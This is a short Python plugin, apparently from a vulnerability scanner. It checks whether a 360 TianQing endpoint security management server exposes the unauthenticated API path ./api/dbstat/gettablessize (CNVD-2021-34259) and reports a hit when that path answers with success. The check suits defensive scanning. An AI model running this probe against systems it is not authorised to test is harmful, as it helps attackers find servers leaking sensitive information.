# -*-* coding:UTF-8


class Plugin(Base):
    __info__ = {
        "author": "doimet",
        "references": ["-"],
        "name": "360天擎终端安全管理系统未授权访问漏洞",
        "description": "天擎终端安全管理系统存在未授权访问漏洞。攻击者可利用漏洞获取敏感信息",
    }

    def url(self) -> dict:
        r = self.request(
            method='get',
            path='./api/dbstat/gettablessize',
            timeout=15
        )
        if r.status_code == 200 and '"result":0,"reason":"success"' in r.text:
            return {
                "LoopholeInfo": {"app": "TianQing", "name": "CNVD-2021-34259"}
            }
